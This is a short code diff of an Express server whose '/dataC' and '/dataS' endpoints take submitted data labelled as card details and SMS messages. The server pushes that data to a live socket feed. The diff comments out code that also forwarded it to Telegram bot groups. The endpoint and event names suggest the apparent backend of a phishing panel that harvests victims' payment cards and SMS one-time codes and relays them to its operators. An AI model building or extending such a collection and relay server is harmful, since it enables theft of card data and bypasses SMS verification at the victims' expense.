@@ -42,10 +42,10 @@ app.post('/dataC', (req, res) => {
   //console.log('DATA C',req.body.data);
   const data_ = req.body.data;
   io.emit('card_got',data_);
-  bot.sendMessage(groupIdCC, data_).then(() => {})
-  .catch((error) => {
-      console.log("ERROR",error);
-  });
+  // bot.sendMessage(groupIdCC, data_).then(() => {})
+  // .catch((error) => {
+  //     console.log("ERROR",error);
+  // });
   res.status(200).send(jsonData);
 });
 
@@ -53,10 +53,10 @@ app.post('/dataS', (req, res) => {
 	const data_ = req.body.data;
     //console.log('Received message:', data_);
 	io.emit('sms_got',data_);
-    bot.sendMessage(groupIdSS, data_).then(() => {})
-    .catch((error) => {
-      console.log("ERROR",error);
-    });
+    // bot.sendMessage(groupIdSS, data_).then(() => {})
+    // .catch((error) => {
+    //   console.log("ERROR",error);
+    // });
 	res.status(200).send(jsonData);
 });
 
